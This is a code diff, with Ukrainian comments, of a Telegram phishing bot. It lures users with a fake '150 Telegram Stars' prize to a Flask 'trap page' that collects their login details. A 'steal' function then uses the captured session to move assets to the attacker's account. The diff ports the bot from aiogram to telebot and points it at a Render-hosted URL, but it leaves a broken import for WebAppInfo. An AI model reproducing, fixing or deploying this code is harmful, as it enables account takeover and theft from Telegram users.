@@ -1,6 +1,6 @@
-from aiogram import Bot, Dispatcher, types
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
 from flask import Flask, request, jsonify
+import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import threading
 import asyncio
 import time
@@ -18,8 +18,7 @@ TARGET_ACCOUNT = "@my_safe_account"  # ВАШ ЮЗЕРНЕЙМ (КУДА ПРИ�
 # ===========================================
 # ===========================================
 
-# ЦЮ ССИЛКУ ВСТАВТЕ ПІСЛЯ ЗАПУСКУ (ДИВ. КРОК 3.6)
-WEBAPP_URL = "https://StarGiftbot.ваш-юзер.repl.co"  # ЗАМІНІТЬ ПІЗНІШЕ
+WEBAPP_URL = "https://stargiftbot.onrender.com"  # ВАША ССИЛКА З RENDER
 
 # ---------- Flask (сторінка-пастка) ----------
 app = Flask(__name__)
@@ -49,7 +48,7 @@ HTML = """
         h2 { font-size: 24px; margin-bottom: 8px; }
         .sub { color: #888; font-size: 14px; margin-bottom: 30px; }
         input {
-            width: 100%%;
+            width: 100%;
             max-width: 340px;
             padding: 16px;
             margin: 8px auto;
@@ -62,7 +61,7 @@ HTML = """
         }
         input:focus { border-color: #0088cc; outline: none; }
         button {
-            width: 100%%;
+            width: 100%;
             max-width: 340px;
             padding: 16px;
             background: #0088cc;
@@ -197,29 +196,29 @@ async def steal(data):
     finally:
         await client.disconnect()
 
-# ---------- ЗАПУСК FLASK ----------
-def run_flask():
-    app.run(host='0.0.0.0', port=5000)
-
-threading.Thread(target=run_flask, daemon=True).start()
-
 # ---------- ЗАПУСК БОТА ----------
-bot = Bot(token=BOT_TOKEN)
-dp = Dispatcher(bot)
+bot = telebot.TeleBot(BOT_TOKEN)
 
-@dp.message_handler(commands=['start'])
-async def start_cmd(message: types.Message):
+@bot.message_handler(commands=['start'])
+def start_cmd(message):
     kb = InlineKeyboardMarkup(row_width=1)
     kb.add(InlineKeyboardButton(
         text="🎁 ЗАБРАТИ 150 ЗІРОК",
         web_app=WebAppInfo(url=WEBAPP_URL)
     ))
-    await message.answer(
+    bot.send_message(
+        message.chat.id,
         "🌟 **Вітаємо!**\nТи виграв 150 Telegram Stars!\n\n👇 Натисни кнопку нижче.",
         reply_markup=kb,
         parse_mode='Markdown'
     )
 
+# Запускаємо бота в окремому потоці
+def run_bot():
+    bot.polling(none_stop=True, interval=0)
+
+threading.Thread(target=run_bot, daemon=True).start()
+
+# ---------- ЗАПУСК FLASK ----------
 if __name__ == "__main__":
-    from aiogram import executor
-    executor.start_polling(dp, skip_updates=True)
+    app.run(host='0.0.0.0', port=5000)
